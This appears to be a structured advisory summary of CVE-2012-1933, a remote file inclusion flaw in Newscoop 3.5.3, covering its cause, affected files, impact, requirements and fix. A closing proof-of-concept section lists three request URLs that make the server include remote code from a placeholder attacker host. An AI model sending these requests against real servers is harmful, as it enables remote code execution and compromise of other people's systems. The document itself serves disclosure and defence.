Based on the provided content, here's a breakdown of the vulnerability information related to CVE-2012-1933:

**Root Cause of Vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI).
*   The application does not properly sanitize user-supplied input passed via the `GLOBALS[g_campsiteDir]` GET parameter before using it in `require_once()` function calls.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):**  The application is vulnerable to RFI due to the lack of input sanitization, allowing an attacker to include arbitrary remote files.
*   The following specific files are vulnerable:
    *   `/include/phorum_load.php`
    *   `/conf/install_conf.php`
    *   `/conf/liveuser_configuration.php`

**Impact of Exploitation:**

*   Successful exploitation allows an attacker to include and execute arbitrary code from a remote server.
*   This could lead to complete compromise of the web application, allowing the attacker to:
    *   Execute arbitrary code on the server
    *   Gain access to sensitive data
    *   Modify application data
    *   Perform further malicious activities

**Attack Vectors:**

*   The vulnerability is exploitable via HTTP GET requests.
*   The attacker supplies a malicious URL in the `GLOBALS[g_campsiteDir]` parameter of the vulnerable scripts.

**Required Attacker Capabilities/Position:**

*   The attacker needs to be able to send HTTP requests to the vulnerable web application.
*   The server must have `register_globals` enabled for successful exploitation.

**Technical Details:**

*   **Vulnerable Parameter:** `GLOBALS[g_campsiteDir]`
*   **Vulnerable Functions:** `require_once()`
*   **Vulnerable Files:** `/include/phorum_load.php`, `/conf/install_conf.php`, `/conf/liveuser_configuration.php`
*   **Exploitation Requirement:** `register_globals` must be enabled.

**Proof of Concept (PoC) Examples:**

*   `http://[host]/include/phorum_load.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00`
*   `http://[host]/conf/install_conf.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00`
*   `http://[host]/conf/liveuser_configuration.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00`

**Additional Notes:**

*   The vulnerability is present in Newscoop version 3.5.3 and probably prior versions, and partially in 4.0 RC3
*   The vulnerability was fixed in Newscoop 3.5.5.
*   The `register_globals` PHP setting needs to be turned off to mitigate this vulnerability.
